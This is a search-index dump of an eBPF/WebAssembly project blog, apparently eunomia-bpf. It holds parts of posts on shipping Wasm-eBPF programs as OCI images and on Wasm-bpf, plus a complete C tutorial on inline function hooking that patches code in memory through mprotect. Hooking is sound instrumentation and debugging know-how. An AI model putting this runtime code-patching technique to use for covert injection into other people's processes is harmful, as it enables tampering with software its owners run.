/root/.vscode-server-insiders/bin/a7d49b0f35f50e460835a55d20a00a735d1665a3/out/vs/base/node/cpuUsage.sh\n</code></pre></p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#oci-ebpf","title":"\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f","text":"<p>\u5f00\u653e\u5bb9\u5668\u534f\u8bae (OCI) \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\uff0c\u5f00\u653e\u7684\u6cbb\u7406\u7ed3\u6784\uff0c\u4e3a\u5bb9\u5668\u6280\u672f\u5b9a\u4e49\u4e86\u89c4\u8303\u548c\u6807\u51c6\u3002\u5728 Linux \u57fa\u91d1\u4f1a\u7684\u652f\u6301\u4e0b\u6210\u7acb\uff0c\u7531\u5404\u5927\u8f6f\u4ef6\u4f01\u4e1a\u6784\u6210\uff0c\u81f4\u529b\u4e8e\u56f4\u7ed5\u5bb9\u5668\u683c\u5f0f\u548c\u8fd0\u884c\u65f6\u521b\u5efa\u5f00\u653e\u7684\u884c\u4e1a\u6807\u51c6\u3002\u5176\u4e2d\u5305\u62ec\u4e86\u4f7f\u7528 Container Registries \u8fdb\u884c\u5de5\u4f5c\u7684 API\uff0c\u6b63\u5f0f\u540d\u79f0\u4e3a OCI \u5206\u53d1\u89c4\u8303 (\u53c8\u540d\u201cdistribution-spec\u201d)\u3002</p> <p>Docker \u4e5f\u5ba3\u5e03\u63a8\u51fa\u4e0e WebAssembly \u96c6\u6210 (Docker+Wasm) \u7684\u9996\u4e2a\u6280\u672f\u9884\u89c8\u7248\uff0c\u5e76\u8868\u793a\u516c\u53f8\u5df2\u52a0\u5165\u5b57\u8282\u7801\u8054\u76df (Bytecode Alliance)\uff0c\u6210\u4e3a\u6295\u7968\u6210\u5458\u3002Docker+Wasm \u8ba9\u5f00\u53d1\u8005\u80fd\u591f\u66f4\u5bb9\u6613\u5730\u5feb\u901f\u6784\u5efa\u9762\u5411 Wasm \u8fd0\u884c\u65f6\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u501f\u52a9\u4e8e Wasm \u7684\u76f8\u5173\u751f\u6001\uff0c\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u53d1\u5e03\u3001\u4e0b\u8f7d\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u4f8b\u5982\uff0c\u4f7f\u7528 <code>wasm-to-oci</code> \u5de5\u5177\uff0c\u53ef\u4ee5\u5c06 Wasm \u7a0b\u5e8f\u6253\u5305\u4e3a OCI \u955c\u50cf\uff0c\u83b7\u53d6\u7c7b\u4f3c docker \u7684\u4f53\u9a8c\uff1a</p> <pre><code>wasm-to-oci push testdata/hello.wasm &lt;oci-registry&gt;.azurecr.io/wasm-to-oci:v1\nwasm-to-oci pull &lt;oci-registry&gt;.azurecr.io/wasm-to-oci:v1 --out test.wasm\n</code></pre> <p>\u6211\u4eec\u4e5f\u5c06\u5176\u96c6\u6210\u5230\u4e86 eunomia-bpf \u7684 ecli \u5de5\u5177\u4e2d\uff0c\u53ef\u4ee5\u4e00\u884c\u547d\u4ee4\u4ece\u4e91\u7aef\u7684 Github Packages \u4e2d\u4e0b\u8f7d\u5e76\u8fd0\u884c eBPF \u7a0b\u5e8f\uff0c\u6216\u901a\u8fc7 Github Packages \u53d1\u5e03\uff1a</p> <pre><code># push to Github Packages\necli push https://ghcr.io/eunomia-bpf/sigsnoop:latest\n# pull from Github Packages\necli pull https://ghcr.io/eunomia-bpf/sigsnoop:latest\n# run eBPF program\necli run https://ghcr.io/eunomia-bpf/sigsnoop:latest\n</code></pre> <p>\u6211\u4eec\u5df2\u7ecf\u5728 LMP \u9879\u76ee\u7684 eBPF Hub \u4e2d\uff0c\u6709\u4e00\u4e9b\u521b\u5efa\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm-eBPF \u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 eBPF \u5e94\u7528\u5f00\u53d1\uff0c\u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\u7684\u5c1d\u8bd5[11]\uff0c\u4ee5\u53ca\u57fa\u4e8e Wasm \u540c\u65f6\u4f7f\u7528\u591a\u79cd\u4e0d\u540c\u8bed\u8a00\u5f00\u53d1 eBPF \u7684\u7528\u6237\u6001\u6570\u636e\u5904\u7406\u63d2\u4ef6\u7684\u5b9e\u8df5\u3002\u57fa\u4e8e\u6700\u65b0\u7684 Wasm-bpf \u6846\u67b6\uff0c\u6709\u66f4\u591a\u7684\u63a2\u7d22\u6027\u5de5\u4f5c\u53ef\u4ee5\u7ee7\u7eed\u5c55\u5f00\uff0c\u6211\u4eec\u5e0c\u671b\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684\u9488\u5bf9 eBPF \u548c Wasm \u7a0b\u5e8f\u7684\u5305\u7ba1\u7406\u7cfb\u7edf\uff0c\u4ee5\u53ca\u66f4\u591a\u7684\u53ef\u4ee5\u63a2\u7d22\u7684\u5e94\u7528\u573a\u666f\u3002</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#_2","title":"\u603b\u7ed3","text":"<p>\u672c\u6587\u4ee5 Rust \u8bed\u8a00\u4e3a\u4f8b\uff0c\u8ba8\u8bba\u4e86\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757\u4ee5\u53ca\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u3001\u90e8\u7f72\u3001\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u83b7\u5f97\u7c7b\u4f3c Docker \u7684\u4f53\u9a8c\u3002\u66f4\u5b8c\u6574\u7684\u4ee3\u7801\uff0c\u8bf7\u53c2\u8003\u6211\u4eec\u7684 Github \u4ed3\u5e93\uff1ahttps://github.com/eunomia-bpf/wasm-bpf.</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f1a\u7ee7\u7eed\u5b8c\u5584\u5728 Wasm \u4e2d\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\u5f00\u53d1\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\u7684\u4f53\u9a8c\uff0c\u63d0\u4f9b\u66f4\u5b8c\u5584\u7684\u793a\u4f8b\u548c\u7528\u6237\u6001\u5f00\u53d1\u5e93/\u5de5\u5177\u94fe\uff0c\u4ee5\u53ca\u66f4\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\u3002</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#_3","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>wasm-bpf Github \u5f00\u6e90\u5730\u5740\uff1ahttps://github.com/eunomia-bpf/wasm-bpf</li> <li>\u4ec0\u4e48\u662f eBPF\uff1ahttps://ebpf.io/what-is-ebpf</li> <li>WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>\u9f99\u8725\u793e\u533a eBPF \u6280\u672f\u63a2\u7d22 SIG https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf \u9879\u76ee\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf</li> <li>eunomia-bpf \u9879\u76ee\u9f99\u8725 Gitee \u955c\u50cf\uff1ahttps://gitee.com/anolis/eunomia</li> <li>Wasm-bpf: \u67b6\u8d77 Webassembly \u548c eBPF \u5185\u6838\u53ef\u7f16\u7a0b\u7684\u6865\u6881\uff1ahttps://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>\u5f53 Wasm \u9047\u89c1 eBPF \uff1a\u4f7f\u7528 WebAssembly \u7f16\u5199\u3001\u5206\u53d1\u3001\u52a0\u8f7d\u8fd0\u884c eBPF \u7a0b\u5e8f\uff1ahttps://zhuanlan.zhihu.com/p/573941739</li> <li>Docker+Wasm\u6280\u672f\u9884\u89c8\uff1ahttps://zhuanlan.zhihu.com/p/583614628</li> <li>LMP eBPF-Hub: https://github.com/linuxkerneltravel/lmp</li> <li>wasm-to-oci: https://github.com/engineerd/wasm-to-oci</li> <li>btf2wit: https://github.com/eunomia-bpf/btf2wit</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/","title":"Implementing an Inline Hook in C in 5 minutes","text":"<p>One of the fascinating aspects of programming comes when we try to alter the behavior of a program while it is running.</p> <p>In this tutorial, we shed light on one method that can make this possible - an \"Inline Hook\". We will delve into how you can manipulate the execution flow of a program in the C programming language. By implementing an Inline Hook, we aim to divert the program's execution flow to our function, then returning it back to the normal flow.</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#what-is-an-inline-hook","title":"What is an Inline Hook?","text":"<p>An Inline hook is a technique that inserts a piece of code into a running program, altering its control flow. In practice, this is achieved by replacing the first few instructions of a function with a jump to our inserted code (usually another function), which upon completion will jump back, continuing the execution of the original function. Frida is a popular tool that uses this technique to inject code into a running process. It is used for dynamic instrumentation, debugging, and reverse engineering.</p> <p>In our userspace eBPF runtime bpftime (https://github.com/eunomia-bpf/bpftime), we use inline hooking to implement the <code>uprobe</code> feature. bpftime is an userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts.</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#inline-hook-implementation","title":"Inline Hook Implementation","text":"<p>The Inline hook implementation primarily follows five crucial steps:</p> <ol> <li>Identifying the memory address of the function to be hooked.</li> <li>Backing up the initial instructions of the target function that will be overwritten,</li> <li>Writing a jump instruction at the beginning of the target function in the hooked process's memory,</li> <li>Creating the hook function, which will replace the original one,</li> <li>Altering the memory permissions to enable the changes, and restoring them once modifications are complete.</li> </ol> <p>On a side note, Inline Hooking could be limited by modern compiler optimization and certain memory protection procedures such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#inline-hooking-example-how-to-use-it","title":"Inline Hooking Example: how to use it","text":"<p>To make this more digestible, we will use an example scenario. In this example, we will hook a simple function <code>my_function</code>. This code is in <code>main.c</code> and it initially prints \"Hello, world!\". But after applying our hook, it prints \"Hello from hook!\" instead.</p> <pre><code>// This is the original function to hook.\nvoid my_function()\n{\n    printf(\"Hello, world!\\n\");\n}\n</code></pre> <p>Next, we create a hooking function <code>my_hook_function</code> in <code>hook.c</code>. This function will replace <code>my_function</code> and is designed to print \"Hello from hook!\"</p> <pre><code>// This is the hook function.\nvoid my_hook_function()\n{\n    printf(\"Hello from hook!\\n\");\n}\n</code></pre> <p>The <code>inline_hook</code> function is the most critical part of our application. It uses <code>mprotect</code> to change the memory permissions of the target function, making it writable. It then replaces the first few instructions of <code>my_function</code> with a jump instruction to <code>my_hook_function</code>. The original bytes are saved for future restoration.</p> <p>On the main function, we start by calling <code>my_function</code>, enabling the <code>inline_hook</code>, calling <code>my_function</code> again (which now executes <code>my_hook_function</code>), then removing the hook and calling <code>my_function</code> another time to see that it prints the original \"Hello, world!\" string.</p> <pre><code>int main()\n{\n    my_function();\n\n    // Enabling the hook.\n    inline_hook(my_function, my_hook_function);\n\n    // Now calling the function will actually call the hook function.\n    my_function();\n\n    // Removing the hook\n    remove_hook(my_function);\n\n    // Now calling the function will call the original function.\n    my_function();\n\n    return 0;\n}\n</code></pre> <p>After compiling and running the main function, we can observe the output.</p> <pre><code>$ make\n$ ./maps\nHello, world!\nHello from hook!\nHello, world!\n</code></pre> <p>You can find the complete example in the following repository: https://github.com/eunomia-bpf/inline-hook-demo</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#implementation-a-inline-hook","title":"Implementation a inline hook","text":"<p>Let's take a look at the implementation of the <code>inline_hook</code> function. This is a very basic implementation that works on x86_64, ARM64, and ARM32. It is not a complete implementation, but it should be enough to get you started.</p> <pre><code>#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define SIZE_ORIG_BYTES 16\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n        // Write a jump instruction at the start of the original function.\n    *((unsigned char *)orig_func + 0) = 0xE9; // JMP instruction\n    *((void **)((unsigned char *)orig_func + 1)) =\n        (unsigned char *)hook_func - (unsigned char *)orig_func - 5;\n}\n#elif defined(__aarch64__) || defined(_M_ARM64)\n#define SIZE_ORIG_BYTES 32\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func) / 4;\n    if (offset &lt; -0x2000000 || offset &gt; 0x1ffffff) {\n        printf(\"Offset %d out of range!\\n\", offset);\n        exit(1);\n    }\n    uint32_t branch_instruction = 0x14000000 | (offset &amp; 0x03ffffff);\n    *((uint32_t*)orig_func) = branch_instruction;\n}\n#elif defined(__arm__) || defined(_M_ARM)\n#define SIZE_ORIG_BYTES 20\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    // Construct a branch instruction to the hook function.\n    // The instruction for a branch in ARM is 0xEA000000 | ((&lt;offset&gt; / 4) &amp; 0x00FFFFFF)\n    // The offset needs to be divided by 4 because the PC advances by 4 bytes each step in ARM\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func - 8) / 4;\n    int branch_instruction = 0xEA000000 | (offset &amp; 0x00FFFFFF);\n\n    // Write the branch instruction to the start of the original function.\n    *(int *)orig_func = branch_instruction;\n}\n#else\n#error \"Unsupported architecture\"\n#endif\n\nvoid *get_page_addr(void *addr)\n{\n    return (void *)((uintptr_t)addr &amp; ~(getpagesize() - 1));\n}\n\nunsigned char orig_bytes[SIZE_ORIG_BYTES];\n\nvoid inline_hook(void *orig_func, void *hook_func)\n{\n    // Store the original bytes of the function.\n    memcpy(orig_bytes, orig_func, SIZE_ORIG_BYTES);\n\n    // Make the memory page writable.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_WRITE | PROT_EXEC);\n\n    inline_hook_replace_inst(orig_func, hook_func);\n\n    // Make the memory page executable only.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_EXEC);\n}\n\nvoid remove_hook(void *orig_func)\n{\n    // Make the memory page writable.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_WRITE | PROT_EXEC);\n\n    // Restore the original bytes of the function.\n    memcpy(orig_func, orig_bytes, SIZE_ORIG_BYTES);\n\n    // Make the memory page executable only.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_EXEC);\n}\n</code></pre> <p>We start by saving the original bytes of the target function in the <code>orig_bytes</code> array. We then make the memory page writable using <code>mprotect</code>. Next, we replace the first few instructions of the target function with a jump instruction to the hook function. Finally, we restore the memory page's permissions to their original state. <code>get_page_addr</code> computes the page-aligned address. <code>inline_hook</code> sets up the hook by storing original bytes and modifying instructions. <code>remove_hook</code> reverses the changes.</p> <p>The hook installation differs based on the processor architecture.</p> <p>On x86_64, we replace the beginning of the target function with a <code>JMP</code> instruction that redirects to our hook function.</p> <pre><code>#define SIZE_ORIG_BYTES 16\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    // Write a jump instruction at the start of the original function.\n    *((unsigned char *)orig_func + 0) = 0xE9; // JMP instruction\n    *((void **)((unsigned char *)orig_func + 1)) =\n        (unsigned char *)hook_func - (unsigned char *)orig_func - 5;\n}\n</code></pre> <p>Note that in ARM32, the Program Counter (PC) is usually 2 instructions ahead, which is why we subtract 8 (2 instructions * 4 bytes/instruction) when calculating the offset. This might differ between different ARM versions or modes (Thumb vs ARM, etc.) so please adjust accordingly to your target's specifics.</p> <p>Also, you need to increase the SIZE_ORIG_BYTES from 16 to 20 because the minimal branch instruction in ARM is 4 bytes and you're going to replace 5 instructions. This is needed because the branch instruction uses a relative offset and you cannot be sure how far your hook function will be. If your function and hook are within 32MB of each other, you could only replace the first 4 bytes with a branch and wouldn't need to touch the rest.</p> <pre><code>#define SIZE_ORIG_BYTES 20\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func - 8) / 4;\n    int branch_instruction = 0xEA000000 | (offset &amp; 0x00FFFFFF);\n    *(int *)orig_func = branch_instruction;\n}\n</code></pre> <p>Similar to ARM32, ARM64 uses the ARM instruction set. However, there are differences and specifics to consider for ARM64. For example, the encoding of the branch instruction is different and because of the larger address space, you have to create a trampoline for larger offsets that can't be reached by a single branch instruction. The trampoline should be close to the original function so it can be reached by a branch instruction and from there, it will load the full 64 bit address of the hook function.</p> <pre><code>#define SIZE_ORIG_BYTES 32\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func) / 4;\n    // Check if the offset is within the allowable range for a branch instruction.\n    if (offset &lt; -0x2000000 || offset &gt; 0x1ffffff) {\n        printf(\"Offset %d out of range!\\n\", offset);\n        exit(1);\n    }\n    // Construct and write the branch instruction.\n    uint32_t branch_instruction = 0x14000000 | (offset &amp; 0x03ffffff);\n    *((uint32_t*)orig_func) = branch_instruction;\n}\n</code></pre> <p>You can find the complete example in the following repository: https://github.com/eunomia-bpf/inline-hook-demo</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#limitations","title":"Limitations","text":""},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#understanding-the-limitations-of-inline-hooking","title":"Understanding the Limitations of Inline Hooking","text":"<p>Inline Hooking, while a powerful technique for intercepting and modifying function calls in software, has several inherent limitations, particularly in the context of modern operating systems and programming environments. Here, we delve into these limitations in more detail to provide a clearer understanding of the challenges and implications involved. The demostration code is very simple and cannot be used in production.</p>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#1-operating-system-security-mechanisms","title":"1. Operating System Security Mechanisms","text":"<p>Modern operating systems deploy a variety of security mechanisms to prevent malicious or unintended modifications to executing code:</p> <ul> <li> <p>Data Execution Prevention (DEP): DEP is designed to prevent code from being run from data segments of a process, such as the stack or heap. Inline hooking often requires executing code that has been written to these segments, which can be blocked by DEP.</p> </li> <li> <p>Address Space Layout Randomization (ASLR): ASLR randomizes the memory addresses used by system and application files. This complicates the process of inline hooking since the exact address of the target function may change every time the application or system is restarted.</p> </li> <li> <p>Code Signing and Integrity Checks: Some operating systems and applications implement code signing and integrity checks. These mechanisms can detect modifications to code, including inline hooks, and may prevent the modified application from executing or flag it as malicious.</p> </li> </ul>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#2-compiler-optimizations","title":"2. Compiler Optimizations","text":"<p>Modern compilers employ various optimizations that can interfere with inline hooking:</p> <ul> <li>Function Inlining: Compilers may inline functions, which means the function's code is directly inserted into each place it is called, rather than being kept as a separate function. This can eliminate the consistent function entry point that inline hooks rely on.</li> <li>Instruction Reordering and Optimizations: Compilers might reorder instructions or optimize the function's structure in a way that doesn't align well with the assumptions made during the setup of an inline hook, potentially leading to crashes or undefined behavior.</li> </ul>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#3-multi-threading-and-concurrent-execution","title":"3. Multi-threading and Concurrent Execution","text":"<ul> <li>Thread Safety: In multi-threaded applications, ensuring that the hook is correctly applied without interrupting currently executing threads can be challenging. There's a risk of race conditions where one thread might be executing the function being hooked while another is applying the hook.</li> <li>Re-entrancy Issues: If the hooked function or the hook itself is re-entrant (can be called simultaneously from multiple threads), it complicates the inline hooking process. Care must be taken to handle such cases properly to avoid deadlocks or inconsistent program states.</li> </ul>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#4-hardware-and-architecture-specifics","title":"4. Hardware and Architecture Specifics","text":"<ul> <li>Instruction Set Differences: Different processors have different instruction sets and execution models. For instance, ARM and x86 processors have significantly different ways of handling instructions, making the process of writing a universal inline hook more complex.</li> <li>Instruction Length Variations: The length of instructions can vary (especially in variable-length instruction sets like x86), making it difficult to determine how many bytes to overwrite safely without affecting subsequent instructions.</li> </ul>"},{"location":"blog/2024/04/11/implementing-an-inline-hook-in-c-in-5-minutes/#wrapping-up","title":"Wrapping Up","text":"<p>Understanding inline hooking can substantially aid in areas such as software security, testing, and debugging. It provides an avenue to alter and control program behavior on-the-fly. While it is powerful, it also comes with its drawbacks, which need to be handled with care. In conclusion, while inline hooks are powerful tools, they should be used with caution, understanding, and a good knowledge of system architecture.</p> <p>I hope you enjoyed the journey exploring Inline Hooks. Happy coding!</p> <p>Share on  Share on </p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/","title":"Wasm-bpf: Bridging WebAssembly and eBPF for Kernel Programmability","text":"<p>Authors: Yu-Sheng Zheng, Mao-Lin Chou</p> <p>Wasm was initially developed as a secure sandbox for browsers, and has since evolved into a high-performance, cross-platform, and multi-language software sandbox environment for cloud-native software components. The lightweight containerization provided by Wasm also makes it a suitable runtime for the next generation of serverless platforms. Another exciting trend is the rise of eBPF, which enables cloud-native developers to build secure networking, service mesh, and observability components. It is gradually penetrating and deepening into various components of the kernel, providing more powerful programmable interaction capabilities in kernel space.</p> <p>Wasm-bpf is a new open-source project[1] that defines a set of abstract eBPF-related system interfaces and provides a corresponding development toolchain, library, and a universal Wasm + eBPF runtime platform instance. This allows applications in any Wasm virtual machine or Wasm lightweight container to sink and extend their use cases into kernel space, gaining access to almost all data from both kernel and user space. This enables programmable control at the entire operating system level in multiple areas such as networking and security, greatly expanding the applications of the WebAssembly ecosystem outside the browser.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#bringing-more-possibilities-to-cloud-native-webassembly-with-ebpf-based-system-interfaces","title":"Bringing More Possibilities to Cloud-Native WebAssembly with eBPF-based System Interfaces","text":""},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#wasm-wasi","title":"Wasm &amp; WASI","text":"<p>You may have heard Solomon Hykes (co-founder of Docker) say:</p> <p>\"If we had WebAssembly + WASI in 2008, we probably wouldn't have needed to create Docker. That's how important and powerful WebAssembly is. It's the future of compute on the server.\"</p> <p>In 2022, WebAssembly (often abbreviated as Wasm) has become a focal point: new Wasm startups emerging, established companies announcing support for Wasm, Bytecode Alliance releasing numerous Wasm standards, Cloud Native Computing Foundation hosting two WasmDay events, and one of the largest Wasm users, Figma, being acquired by Adobe for an astounding $20 billion[2].</p> <p>Wasm is a binary format that many different languages can compile to, and this binary format can run on a wide range of operating systems and architectures. Java and .NET have similar capabilities, but there is a crucial difference with Wasm: the Wasm runtime does not trust the binary being executed. Wasm applications are isolated in a sandbox and can only access the resources explicitly allowed by the user, such as files or environment variables. Wasm also has many other ideal features (e.g., excellent performance), but it is its security model that enables Wasm to be used in a wide range of environments, from browsers to edge/IoT devices, and even to the cloud[3].</p> <p>Since we cannot rely on existing JavaScript engine interfaces available in browsers, most Wasm lightweight containers running outside the browser currently need to use WASI (WebAssembly System Interface). These runtimes allow Wasm applications to interact with their host operating systems in a similar (but not identical) way to POSIX.</p> <p>However, compared to traditional containers that can use almost any system call, the system resources that WASI can provide are very limited. It currently only offers basic support in areas such as file systems and socket network connections. There are still many gaps in terms of access, control, and management of low-level operating system resources. For example, there is no mature solution for limiting and observing resource usage and behavior of Wasm modules or external processes, fast packet forwarding and processing, or communication with external processes and access to peripherals. This limitation currently restricts most Wasm lightweight containers to compute-intensive applications, while relying on traditional container technologies for networking, security, and other aspects.</p> <p>This is why we started the Wasm-bpf project: to leverage the system interfaces provided by the current kernel-space eBPF and the ability to interact with user space, expanding the blueprint of the entire WASI ecosystem and bringing more possibilities to Wasm applications. At the same time, this approach also enhances the capabilities of eBPF programs in user space.</p> <p>In other words, just as Wasm programs running in browsers can access various system resources provided by the browser through JavaScript engine interfaces, the Wasm-bpf solution allows Wasm applications and containers to access various system resources in the kernel through the eBPF virtual machine interface. Thanks to the broad support for eBPF in the Linux kernel, as well as its portability between different kernel versions and architectures, and the reliability of the kernel BPF verifier engine, we can still ensure application portability and security boundaries to a certain extent.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#wasm-bpf-a-lightweight-wasm-ebpf-runtime-platform","title":"Wasm-bpf: A Lightweight Wasm + eBPF Runtime Platform","text":"<p>The Wasm-bpf project has implemented a complete abstraction mechanism for the system interfaces between the kernel-space eBPF virtual machine and user space. It provides a toolchain to compile eBPF applications into Wasm modules and facilitates efficient bidirectional communication between eBPF programs and Wasm modules through shared memory, without the need for serialization. Leveraging code generation techniques, it offers a consistent and convenient development experience similar to other user space eBPF development frameworks. With the evolving ecosystem of Wasm component models, Wasm-bpf enables the integration, reuse, and unified management of eBPF applications and data processing plugins from different languages for observability, networking, and other eBPF use cases.</p> <p>With libbpf, which has become the de facto API standard for eBPF in user space, and on top of WAMR (wasm-micro-runtime), a complete universal Wasm-eBPF runtime component can be built with just over 300 lines of code. It supports most eBPF use cases and allows anyone using any mainstream Wasm runtime, any eBPF user space library, or any programming language to easily add corresponding virtual machine support and effortlessly implement Wasm-eBPF programs without significant changes.</p> <p>There have been previous explorations of combining eBPF and Wasm in the eunomia-bpf project[4], but it was not designed for native Wasm applications and lightweight containers. It did not conform to the generic programming model of Wasm-eBPF and had lower performance. Therefore, we created a new repository and focused on leveraging eBPF to enhance and extend the use cases of WebAssembly, while also improving the toolchain and development library support for Wasm-eBPF. In turn, a generic Wasm-eBPF development framework, leveraging the Wasm-related ecosystem, can also provide more possibilities for the eBPF community in user space.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#ebpf-safely-and-effectively-extend-the-kernel","title":"eBPF: Safely and Effectively Extend the Kernel","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandboxed programs to run in the kernel of an operating system. It is used to safely and effectively extend the functionality of the kernel without changing its source code or loading kernel modules. By enabling the runtime programmability of the operating system through sandboxed programs, application developers can dynamically add additional functionality to the operating system at runtime. The operating system guarantees security and performance, as if it were natively compiled with just-in-time (JIT) compilation and a verification engine. eBPF programs are portable between kernel versions and can be automatically updated, avoiding workload disruption and node restarts.</p> <p>Today, eBPF is widely used in various scenarios: high-performance network packet processing and load balancing in modern data centers and cloud-native environments, fine-grained observability with very low resource overhead, providing insights for performance troubleshooting, and ensuring secure execution of applications and container runtimes, to name a few. The possibilities are endless, and the innovation released by eBPF in the Linux kernel has just begun[3].</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#the-future-of-ebpf-kernels-javascript-like-programmable-interface","title":"The Future of eBPF: Kernel's JavaScript-like Programmable Interface","text":"<p>JavaScript's introduction to browsers brought programmability and sparked a revolution, making browsers develop into almost independent operating systems. Now let's go back to eBPF: to understand the impact of eBPF's programmability on the Linux kernel, it is helpful to have a high-level understanding of the structure of the Linux kernel and how it interacts with applications and hardware[4].</p> <p>The main purpose of the Linux kernel is to abstract the hardware or virtual hardware and provide a consistent API (system calls) that allows applications to run and share resources. To achieve this goal, we maintain a series of subsystems and layers to allocate these responsibilities[5]. Each subsystem typically allows some degree of configuration to cater to different user needs. If the desired behavior cannot be configured, changes to the kernel or running programs can be made to run in the kernel.</p> Support kernel module natively Writing a kernel module Modify the kernel source code and convince the Linux kernel community of the change Fix it periodically because each kernel version could break it. Security issues! <p>In reality, neither option is commonly used. The former is too costly, and the latter lacks portability.</p> <p>With eBPF, there is a new option to reprogram the behavior of the Linux kernel without changing its source code or loading kernel modules, while maintaining a certain level of consistency and compatibility between different kernel versions and ensuring security[6]. To achieve this, eBPF programs also need a corresponding API that allows user-defined applications to run and share resources within the kernel\u2014 in a sense, the eBPF virtual machine also provides a set of system call-like mechanisms. Through the communication mechanism between eBPF and user space, Wasm virtual machines and user space applications can have full access to this \"system call\", allowing them to programmatically extend traditional system call capabilities and implement more efficient programmable IO handling in various layers such as networking and file systems.</p> <p></p> <p>Today's Linux kernel is evolving towards a new model: user-defined applications can run in both user space and kernel space. User space interacts with the kernel through traditional system calls, while kernel space interacts with user space and other kernel components through BPF helper calls. As of early 2023, the eBPF virtual machine in the kernel already has over 220 helper interfaces, covering a wide range of application scenarios.</p> <p>It is worth noting that BPF helper calls and system calls are not competing with each other. Their programming models and performance advantages are completely different. They do not completely replace each other. The same goes for the Wasm and Wasi ecosystems. Although a specially designed wasi interface needs to go through a lengthy standardization process, it may provide better performance and portability guarantees in specific scenarios. On the other 